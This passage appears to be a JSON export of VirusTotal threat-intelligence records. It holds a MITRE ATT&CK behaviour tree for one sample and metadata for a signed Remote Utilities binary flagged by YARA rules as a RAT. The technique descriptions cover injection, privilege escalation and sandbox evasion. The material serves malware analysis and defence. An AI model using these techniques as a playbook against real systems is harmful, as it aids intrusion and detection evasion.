            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM). Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "connect to WMI namespace via WbemLocator"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1047/",
                "id": "T1047",
                "name": "Windows Management Instrumentation"
              },
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "accept command line arguments"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              },
              {
                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "interact with driver via control codes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1569/002/",
                "id": "T1569.002",
                "name": "Service Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\nPolicies, procedures, and standards\nPhysical / logical network diagrams\nSystem architecture diagrams\nTechnical system documentation\nTesting / development credentials\nWork / project schedules\nSource code snippets\nLinks to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "reference WMI statements"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1213/",
                "id": "T1213",
                "name": "Data from Information Repositories"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "check OS version"
                  },
                  {
                    "severity": "INFO",
                    "description": "query environment variable"
                  },
                  {
                    "severity": "INFO",
                    "description": "get memory capacity"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get file system object information"
                  },
                  {
                    "severity": "INFO",
                    "description": "check if file exists"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "get common file path"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "find graphical window"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1010/",
                "id": "T1010",
                "name": "Application Window Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry value"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "reference anti-VM strings targeting Xen"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/001/",
                "id": "T1497.001",
                "name": "System Checks"
              },
              {
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get token membership"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1033/",
                "id": "T1033",
                "name": "System Owner/User Discovery"
              },
              {
                "description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as GetLocaleInfoW can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get geographical location"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1614/",
                "id": "T1614",
                "name": "System Location Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "modify access privileges"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1134/",
                "id": "T1134",
                "name": "Access Token Manipulation"
              },
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "set file attributes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              },
              {
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "reference anti-VM strings targeting Xen"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/001/",
                "id": "T1497.001",
                "name": "System Checks"
              },
              {
                "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "decrypt data using AES via x86 extensions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1140/",
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information"
              },
              {
                "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. \nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "hide graphical window"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/003/",
                "id": "T1564.003",
                "name": "Hidden Window"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  },
                  {
                    "severity": "INFO",
                    "description": "encrypt data using AES"
                  },
                  {
                    "severity": "INFO",
                    "description": "reference AES constants"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "modify access privileges"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1134/",
                "id": "T1134",
                "name": "Access Token Manipulation"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5158482849c818c270f302c1dfa06d770ed2b5056cf393d60fd56817636866da/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f8088758a13aafaf285f"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T1DF277E13B684953AD09B1A3A5D37DB945D3F7E612A168C0B7BF8394C1F356802E3B287",
      "vhash": "0270b6666d5c0d5d551c042260400ad00e7024z18155ze0100ff0605038z3",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "RemoteUtilitiesRAT RAT payload",
          "source": "https://github.com/ditekshen/detection",
          "author": "ditekSHen",
          "ruleset_name": "malware",
          "rule_name": "MALWARE_Win_RemoteUtilitiesRAT",
          "ruleset_id": "00cc803bdc"
        },
        {
          "ruleset_id": "0188546a9e",
          "rule_name": "susp_b64_enc",
          "ruleset_name": "base64_enc",
          "source": "github.com/RussianPanda95/Malware-Rules-IOCs",
          "author": "RussianPanda"
        }
      ],
      "creation_date": 1698238264,
      "names": [
        "rutserv.exe"
      ],
      "signature_info": {
        "product": "Remote Utilities",
        "verified": "Signed",
        "description": "Remote Utilities - Host",
        "file version": "7.2.2.0",
        "signing date": "12:51 PM 10/25/2023",
        "x509": [
          {
            "valid usage": "Code Signing",
            "name": "DigiCert Global G3 Code Signing ECC SHA384 2021 CA1",
            "algorithm": "SHA384ECDSA",
            "valid from": "2021-04-29 00:00:00",
            "valid to": "2036-04-28 23:59:59",
            "serial number": "0F B8 A7 40 B9 15 8D 03 51 43 BC 59 D9 F0 40 29",
            "cert issuer": "DigiCert Global Root G3",
            "thumbprint": "8F5C0C8E414AF89DBFF272125E28D417EE5FF559"
          },
          {
            "valid usage": "Code Signing",
            "name": "Remote Utilities Pty (Cy) Ltd",
            "algorithm": "SHA384ECDSA",
            "valid from": "2023-02-22 00:00:00",
            "valid to": "2024-03-08 23:59:59",
            "serial number": "0E F3 2A 47 AC 0D 6A 5A EF 6E 23 8C 41 7E DB 1D",
            "cert issuer": "DigiCert Global G3 Code Signing ECC SHA384 2021 CA1",
            "thumbprint": "B2AF07924A908CFE3862F63A2472A56B13C3A970"
          },
          {
            "valid usage": "ff",
            "name": "DigiCert Timestamp 2023",
            "algorithm": "sha256RSA",
            "valid from": "2023-07-14 00:00:00",
            "valid to": "2034-10-13 23:59:59",
            "serial number": "05 44 AF F3 94 9D 08 39 A6 BF DB 3F 5F E5 61 16",
            "cert issuer": "DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA",
            "thumbprint": "66F02B32C2C2C90F825DCEAA8AC9C64F199CCF40"
          },
          {
            "valid usage": "Timestamp Signing",
            "name": "DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA",
            "algorithm": "sha256RSA",
            "valid from": "2022-03-23 00:00:00",
            "valid to": "2037-03-22 23:59:59",
            "serial number": "07 36 37 B7 24 54 7C D8 47 AC FD 28 66 2A 5E 5B",
            "cert issuer": "DigiCert Trusted Root G4",
            "thumbprint": "B6C8AF834D4E53B673C76872AA8C950C7C54DF5F"
          },
          {
            "name": "DigiCert Trusted Root G4",
            "algorithm": "sha384RSA",
            "valid from": "2022-08-01 00:00:00",
            "valid to": "2031-11-09 23:59:59",
            "serial number": "0E 9B 18 8E F9 D0 2D E7 EF DB 50 E2 08 40 18 5A",
            "cert issuer": "DigiCert Assured ID Root CA",
            "thumbprint": "A99D5B79E9F1CDA59CDAB6373169D5353F5874C6"
          }
        ],
        "signers": "Remote Utilities Pty (Cy) Ltd; DigiCert Global G3 Code Signing ECC SHA384 2021 CA1; DigiCert Global Root G3",
        "counter signers details": [
          {
            "status": "Valid",
            "valid usage": "Timestamp Signing",
            "name": "DigiCert Timestamp 2023",
            "algorithm": "sha256RSA",
            "valid from": "12:00 AM 07/14/2023",
            "valid to": "11:59 PM 10/13/2034",
            "serial number": "05 44 AF F3 94 9D 08 39 A6 BF DB 3F 5F E5 61 16",
            "cert issuer": "DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA",
            "thumbprint": "66F02B32C2C2C90F825DCEAA8AC9C64F199CCF40"
          },
          {
            "status": "Valid",
            "valid usage": "Timestamp Signing",
            "name": "DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA",
            "algorithm": "sha256RSA",
            "valid from": "12:00 AM 03/23/2022",
            "valid to": "11:59 PM 03/22/2037",
            "serial number": "07 36 37 B7 24 54 7C D8 47 AC FD 28 66 2A 5E 5B",
            "cert issuer": "DigiCert Trusted Root G4",
            "thumbprint": "B6C8AF834D4E53B673C76872AA8C950C7C54DF5F"
          },
          {
            "status": "Valid",
            "valid usage": "All",
            "name": "DigiCert Trusted Root G4",
            "algorithm": "sha384RSA",
            "valid from": "12:00 AM 08/01/2022",
            "valid to": "11:59 PM 11/09/2031",
            "serial number": "0E 9B 18 8E F9 D0 2D E7 EF DB 50 E2 08 40 18 5A",
            "cert issuer": "DigiCert Assured ID Root CA",
            "thumbprint": "A99D5B79E9F1CDA59CDAB6373169D5353F5874C6"
          },
          {
            "status": "Valid",
            "valid usage": "Client Auth, Code Signing, Email Protection, Server Auth, Timestamp Signing",
            "name": "DigiCert",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 11/10/2006",
            "valid to": "12:00 AM 11/10/2031",
            "serial number": "0C E7 E0 E5 17 D8 46 FE 8F E5 60 FC 1B F0 30 39",
            "cert issuer": "DigiCert Assured ID Root CA",
            "thumbprint": "0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43"
          }
        ],
        "counter signers": "DigiCert Timestamp 2023; DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA; DigiCert Trusted Root G4; DigiCert",
        "copyright": "Copyright © 2023 Remote Utilities Pty (Cy) Ltd. All rights reserved.",
        "signers details": [
          {
            "status": "Valid",
            "valid usage": "Code Signing",
            "name": "Remote Utilities Pty (Cy) Ltd",
            "algorithm": "sha384ECDSA",
            "valid from": "12:00 AM 02/22/2023",
            "valid to": "11:59 PM 03/08/2024",
            "serial number": "0E F3 2A 47 AC 0D 6A 5A EF 6E 23 8C 41 7E DB 1D",
            "cert issuer": "DigiCert Global G3 Code Signing ECC SHA384 2021 CA1",
            "thumbprint": "B2AF07924A908CFE3862F63A2472A56B13C3A970"
          },
          {
            "status": "Valid",
            "valid usage": "Code Signing",
            "name": "DigiCert Global G3 Code Signing ECC SHA384 2021 CA1",
            "algorithm": "sha384ECDSA",
            "valid from": "12:00 AM 04/29/2021",
            "valid to": "11:59 PM 04/28/2036",
            "serial number": "0F B8 A7 40 B9 15 8D 03 51 43 BC 59 D9 F0 40 29",
            "cert issuer": "DigiCert Global Root G3",
            "thumbprint": "8F5C0C8E414AF89DBFF272125E28D417EE5FF559"
          },
          {
            "status": "Valid",
            "valid usage": "Client Auth, Code Signing, Email Protection, Server Auth, Timestamp Signing",
            "name": "DigiCert Global Root G3",
            "algorithm": "sha384ECDSA",
            "valid from": "12:00 PM 08/01/2013",
            "valid to": "12:00 PM 01/15/2038",
            "serial number": "05 55 56 BC F2 5E A4 35 35 C3 A4 0F D5 AB 45 72",
            "cert issuer": "DigiCert Global Root G3",
            "thumbprint": "7E04DE896A3E666D00E687D33FFAD93BE83D349E"
          }
        ]
      },
      "last_modification_date": 1706331790,
      "type_tag": "peexe",
      "times_submitted": 12,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 21148984,
      "popular_threat_classification": {
        "suggested_threat_label": "hacktool.remoteutilities",
        "popular_threat_category": [
          {
            "count": 4,
            "value": "hacktool"
          },
          {
            "count": 2,
            "value": "virus"
          }
        ],
        "popular_threat_name": [
          {
            "count": 4,
            "value": "remoteutilities"
          }
        ]
      },
